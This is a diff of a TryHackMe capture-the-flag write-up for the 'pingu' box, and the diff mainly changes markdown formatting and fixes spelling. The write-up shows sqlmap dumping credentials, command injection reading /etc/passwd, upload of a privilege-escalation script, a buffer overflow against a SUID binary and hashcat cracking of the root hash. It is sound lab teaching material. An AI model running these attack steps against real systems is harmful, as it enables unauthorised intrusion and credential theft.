@@ -6,13 +6,12 @@ categories:
   - TryHackMe
 ---
 
-<img src="pingu.jpeg" width=200 height=200 alt="pingu">
+{{< post-img src="pingu.jpeg" alt="pingu" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
 
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -30,9 +29,8 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### ffuf
 
-```
+```bash
  :: Method           : GET
  :: URL              : http://10.10.5.111/FUZZ.php
  :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
@@ -51,10 +49,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 its guided room...so speedrun
-
 obvious sql injection
 
-```
+```bash
 sqlmap -u http://10.10.5.111/administrator.php --forms --dump
 
 Parameter: username (POST)
@@ -84,50 +81,48 @@ Table: users
 
 After login the rce input says "command"...bruh we know its RCE but damn that was direct
 
-```
+```bash
 ls
 
 2591c98b70119fe624898b1e424b5e91.php administrator.php index.html index.html
 ```
 
-```
+```bash
 cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false \_apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false papa:x:1000:1000:qaa:/home/papa:/bin/bash mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin pingu:x:1002:1002::/home/pingu:/bin/bash pingu:x:1002:1002::/home/pingu:/bin/bash
 ```
 
 pingu and papa are users
-
 At this point we could just use a shell to get inside but I want to do it the other way
 
 `find / -type f -user pingu`
 
-```
+```bash
 /home/pingu/.cache/motd.legal-displayed /home/pingu/.ssh/id_rsa /home/pingu/.ssh/id_rsa.pub /home/pingu/.gdb_history /home/pingu/.pwntools-cache-2.7/update /home/pingu/.pwntools-cache-2.7/update
 ```
 
 `find / -type f -user papa`
 
-```
+```bash
 /home/papa/.bash_history /home/papa/.bash_logout /home/papa/.profile /home/papa/.bashrc /home/papa/.sudo_as_admin_successful /home/papa/.pwntools-cache-2.7/update /var/backups/shadow.bak /var/backups/shadow.bak
 ```
 
 Ah..I may be doing this wrong
-
 Assuming we have access to the file let's try this
 
 `find / -user www-data`
 
-Among a thousand files...the last ones are interresting
+Among a thousand files...the last ones are interesting
 
-```
+```bash
 ...
 /var/hidden/pass /var/hidden/pass
 ```
 
 `cat /var/hidden/pass`
 
-```
+```bash
 pinguapingu pinguapingu
 ```
 
@@ -139,7 +134,7 @@ I am not a big fan of privesc scripts but hey..let's load that noisy linenum
 
 `scp LinEnum.sh pingu@10.10.8.121:/tmp`
 
-```
+```bash
 ....
 
 [-] SUID files:
@@ -165,15 +160,13 @@ I am not a big fan of privesc scripts but hey..let's load that noisy linenum
 ....
 ```
 
-yeah definitelly `/opt/secret/root`
+yeah definitely `/opt/secret/root`
 
 Oh cool the binary exploitation part
-
 `gdb /opt/secret/root` (I need pwndbg too)
-
 we run cyclic input to pass 50 characters when the program expects 32
 
-```
+```bash
 r < <(cyclic 50)
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -211,7 +204,7 @@ heh...segfault at 0x6161616c...trying to overwrite EIP
 
 `pwndbg> cyclic -l 0x6161616c`
 
-```
+```bash
 44
 ```
 
@@ -219,7 +212,7 @@ we need 44 chars to overwrte EIP
 
 I chose the manual way over pwntools but both are handy
 
-```
+```bash
 pwndbg> disassemble shell
 Dump of assembler code for function shell:
 0x080484cb <+0>: push ebp
@@ -253,13 +246,13 @@ And pipe it to the program...to reveal the hashed password
 
 I need to learn assembly ASAP
 
-```
+```text
 $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
 ```
 
 Might be SHA-512...so hashcat mode..1800?
 
-```
+```bash
 hashcat -m 1800 '$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.' /usr/share/wordlists/rockyou.txt
 ```
 
